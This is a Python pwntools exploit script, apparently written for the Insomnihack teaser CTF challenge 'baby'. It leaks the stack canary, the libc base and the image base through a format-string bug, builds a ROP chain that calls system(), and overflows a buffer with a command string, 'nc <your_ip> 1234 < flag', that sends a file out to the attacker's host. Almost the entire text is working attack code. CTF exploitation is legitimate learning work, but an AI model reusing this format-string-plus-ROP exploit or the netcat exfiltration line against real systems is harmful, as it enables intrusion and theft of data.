from pwn import *
import struct
import IPython
System = 0
System_Offset = 0x045390
Shellcode = "AAAAAAAAAAAAAAAAAAAAAA; nc <your_ip> 1234 < flag;" + "\x00"
Image_Offset = 0x1bf0
printf_offset = 0x202f08
libc_offset = 0x20830


conn = remote('baby.teaser.insomnihack.ch',1337)
message = conn.recvuntil('>',drop=True)


# Leak Stack Addresses
def leak(n, s):
    conn.send('2\n')
    conn.recvline()
    conn.send("%"+ str(n) + "$p\n")
    conn.recvuntil('> ',drop=True)
    leak = conn.recvuntil('\n', drop=True)
    print("Leaked " + s + ": " + leak)
    return int(leak, 16)


# Leak Stack Canary
stack_canary = leak(138, "Stack Canary")

# Leak Libc + System Address
libc = leak(158, "Libc Address")
libc = libc - libc_offset
print("Leaked Libc Base: " + hex(libc))
System = libc + System_Offset
print("Calculated System Address: " + hex(System))

## Leak ImageBase
image = leak(146, "Imagebase Pointer")
image = image - Image_Offset
printf = image + printf_offset
print("Calculated ImageBase: " + hex(image))
print("Calculated GoT Offset for PrintF: " + hex(printf))

### Leak Stack Address
stack = leak(1, "Stack Address")

#Building ROP
gadgets = "".join([struct.pack("<Q",i) for i in[
    image + 0x0000000000001c8b, # pop rdi # ret
    stack, # Point to shellcode
    System, # Filler to get System Address to RDI
]])

conn.send('\n')
print(conn.recvline())
# Trigger BO
print(conn.recvuntil('> ',drop=True))
answer = ""
print("sending 1")
conn.send('1\n')
print("sending 2000")
conn.send('1300\n')
print("sending BO Trigger")


#Building Buffer
Buffer = Shellcode + "A"*(1037-len(Shellcode)) + p64(stack_canary) + "A" * 8 + gadgets + p64(stack) + p64(System) + "E" * (1300-1032-8-len(gadgets)-8-8)
conn.send(Buffer + '\n')





